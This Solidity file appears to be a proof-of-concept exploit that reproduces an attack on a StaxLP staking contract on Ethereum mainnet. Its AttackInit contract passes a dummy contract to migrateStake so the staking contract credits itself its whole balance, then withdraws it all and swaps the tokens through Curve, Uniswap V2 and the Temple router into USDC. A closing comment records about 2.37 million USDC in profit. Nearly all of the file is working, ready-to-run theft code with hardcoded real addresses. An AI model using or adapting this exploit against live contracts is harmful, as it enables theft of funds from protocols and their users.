// SPDX-License-Identifier: agpl-3.0
pragma solidity 0.8.4;

import "hardhat/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICurve { 
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface ITempleUniV2Pair {
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface ITempleRouter {
    function swapExactTempleForStable(uint amountIn, uint amountOutMin, address stable, address to, uint deadline) external returns (uint);
}

interface IStaxLPStaking {
    function withdrawAll(bool claim) external;
    function migrateStake(address oldStaking, uint256 amount) external;  
    function migrateWithdraw(address staker, uint256 amount) external;
}

contract myStaxLPStaking {
    constructor() { }
    function withdrawAll(bool claim) external { }
    function migrateWithdraw(address staker, uint256 amount) external { }
    function migrateStake(address oldStaking, uint256 amount) external { }  
}

// Main attack contract
contract AttackInit {

    address owner;
    address staxLPStaking = 0xd2869042E12a3506100af1D192b5b04D65137941;
    address staxLPToken = 0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9;
    address dummyContract;

    constructor() {
        owner = msg.sender;
        dummyContract = address(new myStaxLPStaking());
    }

    fallback () external payable { }
    receive  () external payable { }

    function exploit() public {
        uint256 balance = IERC20(staxLPToken).balanceOf(staxLPStaking);
        IStaxLPStaking(staxLPStaking).migrateStake(dummyContract, balance);  // Exploit happens here
        IStaxLPStaking(staxLPStaking).withdrawAll(false);  // Redeem "gifted" tokens

        balance = IERC20(staxLPToken).balanceOf(address(this));
        console.log("StaxLP balance after exploit is: ", balance);

        swapSTAXToUSDC();
    }

    function swapSTAXToUSDC() public {
        address crvFraxUSDC = 0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2;
        address crvStaxFraxTemple = 0xdaDfD00A2bBEb1abc4936b1644a3033e1B653228;
        address uniV2PairFraxTemple = 0x6021444f1706f15465bEe85463BCc7d7cC17Fc03;
        address templeRouter = 0x98257C876ACe5009e7B97843F8c71b3AE795c71E;
        address temple = 0x470EBf5f030Ed85Fc1ed4C2d36B9DD02e77CF1b7;
        address frax = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

        uint256 umax = type(uint256).max;

        // Swap StaxLP for FraxTemple-UNI tokens
        uint256 balance = IERC20(staxLPToken).balanceOf(address(this));
        IERC20(staxLPToken).approve(crvStaxFraxTemple, umax);
        ICurve(crvStaxFraxTemple).exchange(0, 1, balance, 0);

        // Swap FraxTemple-UNI tokens for Frax and Temple
        balance = IERC20(uniV2PairFraxTemple).balanceOf(address(this));
        IERC20(uniV2PairFraxTemple).transfer(uniV2PairFraxTemple, balance);
        ITempleUniV2Pair(uniV2PairFraxTemple).burn(address(this));

        // Swap Temple for Frax
        balance = IERC20(temple).balanceOf(address(this));
        IERC20(temple).approve(templeRouter, umax);
        ITempleRouter(templeRouter).swapExactTempleForStable(balance, 0, frax, address(this), block.timestamp + 2000);

        // Swap Frax for USDC
        balance = IERC20(frax).balanceOf(address(this));
        IERC20(frax).approve(crvFraxUSDC, umax);
        ICurve(crvFraxUSDC).exchange(0, 1, balance, 0);
    }


    // Check the balance of a given address in the tokens targeted by the exploit
    function checkBalance(address addressToCheck) public view {
        uint256 balance;
        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        console.log("----ATK BALANCES of %s ----", addressToCheck);
        balance = IERC20(usdc).balanceOf(addressToCheck);
        console.log("USDC: ", balance);
        console.log("----END BALANCES of %s ----", addressToCheck);
    }
}

// PROFIT:
// -------
// USDC: 2.376.872,474293
// 